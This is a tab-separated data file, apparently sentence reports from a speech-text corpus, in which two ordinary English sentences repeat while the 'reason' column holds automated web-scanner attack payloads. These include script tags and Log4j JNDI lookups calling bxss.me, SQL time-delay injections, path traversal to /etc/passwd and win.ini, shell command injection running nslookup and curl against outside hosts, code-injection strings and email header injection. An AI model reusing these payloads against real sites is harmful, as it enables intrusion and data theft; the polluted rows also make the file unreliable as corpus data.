sentence	sentence_id	locale	reason
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	1F7gqxO
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	OcuUAWvx
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language%00
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language%0abcc:009365.354-1594.354.a4363.19651.2@bxss.me
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	to@example.com>%0d%0abcc:009365.354-1595.354.a4363.19651.2@bxss.me
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language<esi:include src="http://bxss.me/rpb.png"/>
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	${10000253+9999027}
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language&n947116=v951406
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	xfs.bxss.me
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	)
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	!(()&&!|*|*|
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	^(#$!@#$)(()))******
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	HttP://bxss.me/t/xss.html?%00
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	'.gethostbyname(lc('hitsj'.'fibgaohdf95bb.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(114).chr(69).chr(97).chr(69).'
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language'>"></title></style></textarea></noscript></template></script><script/src="//bxss.me/bsp?u=009365&r=354-1603&h=354-a4363-2&"></script>
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	".gethostbyname(lc("hitgv"."fbfbgkjned650.bxss.me."))."A".chr(67).chr(hex("58")).chr(103).chr(81).chr(102).chr(82)."
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	bxss.me/t/xss.html?%00
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	'"()
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	${j${::-n}di:dns${::-:}${::-/}${::-/}hitzsngwlbgwc1cfba${::-.}bxss.me}zzzz${url:UTF-8:http://hitgflwaninxe.bxss.me/}
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	../../../../../../../../../../../../../../etc/passwd
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language'&&sleep(27*1000)*cbpdri&&'
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	../../../../../../../../../../../../../../windows/win.ini
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language'"()&%<zzz><ScRiPt >ntj6(9332)</ScRiPt>
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	'"()&%<zzz><ScRiPt >ntj6(9355)</ScRiPt>
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language"&&sleep(27*1000)*qwcnzz&&"
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	file:///etc/passwd
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language9938325
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language'||sleep(27*1000)*hybecv||'
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language"||sleep(27*1000)*esbbra||"
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	../offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs%3F.jpg
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}${::-/}${::-/}dns.log4j.009365.354-1605.354.a4363${::-.}1${::-.}bxss.me}}
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs%00.jpg
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	Http://bxss.me/t/fit.txt
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	str(__import__('time').sleep(9))+__import__('socket').gethostbyname('hitgpedflhkee8bfd2.'+'bxss.me')
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	http://bxss.me/t/fit.txt%3F.jpg
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	;assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	'+str(__import__("time").sleep(9))+__import__("socket").gethostbyname("hitgpedflhkee8bfd2."+"bxss.me")+'
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	response.write(9570612*9943450)
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	'"
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	'+response.write(9570612*9943450)+'
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	"+str(__import__('time').sleep(9))+__import__('socket').gethostbyname('hitgpedflhkee8bfd2.'+'bxss.me')+"
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	';print(md5(31337));$a='
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	http://hitkefrcqunsr.bxss.me/
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	/etc/shells
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	";print(md5(31337));$a="
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	<!--
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	"+response.write(9570612*9943450)+"
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	c:/windows/win.ini
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	${@print(md5(31337))}
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	hitkefrcqunsr.bxss.me
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	bxss.me
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	${@print(md5(31337))}\
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	'.print(md5(31337)).'
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	echo sbcfra$()\ cyutjv\nz^xyu||a #' &echo sbcfra$()\ cyutjv\nz^xyu||a #|" &echo sbcfra$()\ cyutjv\nz^xyu||a #
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	&echo djmruo$()\ rsnvrh\nz^xyu||a #' &echo djmruo$()\ rsnvrh\nz^xyu||a #|" &echo djmruo$()\ rsnvrh\nz^xyu||a #
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	|echo ftjeuf$()\ hwxgpf\nz^xyu||a #' |echo ftjeuf$()\ hwxgpf\nz^xyu||a #|" |echo ftjeuf$()\ hwxgpf\nz^xyu||a #
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	(nslookup -q=cname hitdwqztwtzsd9a243.bxss.me||curl hitdwqztwtzsd9a243.bxss.me))
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	$(nslookup -q=cname hitvsqtapmwrl828cb.bxss.me||curl hitvsqtapmwrl828cb.bxss.me)
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	&nslookup -q=cname hitccndqorgjdb2c26.bxss.me&'\"`0&nslookup -q=cname hitccndqorgjdb2c26.bxss.me&`'
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	&(nslookup -q=cname hitjraghxodqn73939.bxss.me||curl hitjraghxodqn73939.bxss.me)&'\"`0&(nslookup -q=cname hitjraghxodqn73939.bxss.me||curl hitjraghxodqn73939.bxss.me)&`'
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	|(nslookup -q=cname hitptirwesoomddde5.bxss.me||curl hitptirwesoomddde5.bxss.me)
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	`(nslookup -q=cname hitkfgsyfkpdk1d009.bxss.me||curl hitkfgsyfkpdk1d009.bxss.me)`
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	;(nslookup -q=cname hitjgcosrxqio04073.bxss.me||curl hitjgcosrxqio04073.bxss.me)|(nslookup -q=cname hitjgcosrxqio04073.bxss.me||curl hitjgcosrxqio04073.bxss.me)&(nslookup -q=cname hitjgcosrxqio04073.bxss.me||curl hitjgcosrxqio04073.bxss.me)
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	PcMQlLc5
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	-1 OR 2+611-611-1=0+0+0+1 -- 
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	-1 OR 2+493-493-1=0+0+0+1
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	-1' OR 2+557-557-1=0+0+0+1 -- 
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	-1' OR 2+644-644-1=0+0+0+1 or 'ZOXcBw27'='
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	-1" OR 2+811-811-1=0+0+0+1 -- 
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	if(now()=sysdate(),sleep(15),0)
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	0"XOR(if(now()=sysdate(),sleep(15),0))XOR"Z
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'"+(select(0)from(select(sleep(15)))v)+"*/
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	1 waitfor delay '0:0:15' -- 
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	OqSZ3PfX'; waitfor delay '0:0:15' -- 
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	0tvy7pgO' OR 25=(SELECT 25 FROM PG_SLEEP(15))--
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	ULmCkOdA') OR 696=(SELECT 696 FROM PG_SLEEP(15))--
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	wh2zBidW')) OR 292=(SELECT 292 FROM PG_SLEEP(15))--
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	1'"
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	@@RICpB
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	XsbjDflz
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language'>"></title></style></textarea></noscript></template></script><script/src="//bxss.me/bsp?u=009365&r=354-2361&h=354-a4363-2&"></script>
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language&n934039=v968104
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language%0abcc:009365.354-2364.354.a4363.19651.2@bxss.me
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	${9999446+9999859}
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language%00
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	to@example.com>%0d%0abcc:009365.354-2365.354.a4363.19651.2@bxss.me
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	response.write(9619139*9543313)
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language<esi:include src="http://bxss.me/rpb.png"/>
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	'+response.write(9619139*9543313)+'
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	)
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	"+response.write(9619139*9543313)+"
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	xfs.bxss.me
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	HttP://bxss.me/t/xss.html?%00
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	str(__import__('time').sleep(9))+__import__('socket').gethostbyname('hitfvnbjpgazn13d91.'+'bxss.me')
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	!(()&&!|*|*|
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	'.gethostbyname(lc('hitjb'.'zbgsxduh04b3d.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(119).chr(75).chr(98).chr(80).'
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	bxss.me/t/xss.html?%00
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	'+str(__import__("time").sleep(9))+__import__("socket").gethostbyname("hitfvnbjpgazn13d91."+"bxss.me")+'
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	^(#$!@#$)(()))******
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	http://hitrjzywprniw.bxss.me/
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	".gethostbyname(lc("hitxv"."xqzbqmnr2a28b.bxss.me."))."A".chr(67).chr(hex("58")).chr(122).chr(70).chr(107).chr(71)."
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	"+str(__import__('time').sleep(9))+__import__('socket').gethostbyname('hitfvnbjpgazn13d91.'+'bxss.me')+"
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	'"
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	hitrjzywprniw.bxss.me
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	../../../../../../../../../../../../../../etc/passwd
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	<!--
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	${j${::-n}di:dns${::-:}${::-/}${::-/}hitbofdiudxsk852db${::-.}bxss.me}zzzz${url:UTF-8:http://hitnhusowpqvu.bxss.me/}
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	../../../../../../../../../../../../../../windows/win.ini
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	'"()
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language'&&sleep(27*1000)*wsdbgp&&'
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	file:///etc/passwd
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language"&&sleep(27*1000)*cvcnzp&&"
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	;assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language'||sleep(27*1000)*kbhopv||'
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	';print(md5(31337));$a='
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	../offensive-language
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	";print(md5(31337));$a="
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language"||sleep(27*1000)*fcoxlo||"
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	${@print(md5(31337))}
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	${@print(md5(31337))}\
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}${::-/}${::-/}dns.log4j.009365.354-2377.354.a4363${::-.}1${::-.}bxss.me}}
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	'.print(md5(31337)).'
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	offensive-language'"()&%<zzz><ScRiPt >AQAS(9371)</ScRiPt>
Then Bremer departed from Iraq early, leaving important loose ends dangling-like-the audit.	de15e6005df52670b653b6ef9c9349297a466fd93448b0e7df081407d699ed97	en	'"()&%<zzz><ScRiPt >AQAS(9173)</ScRiPt>
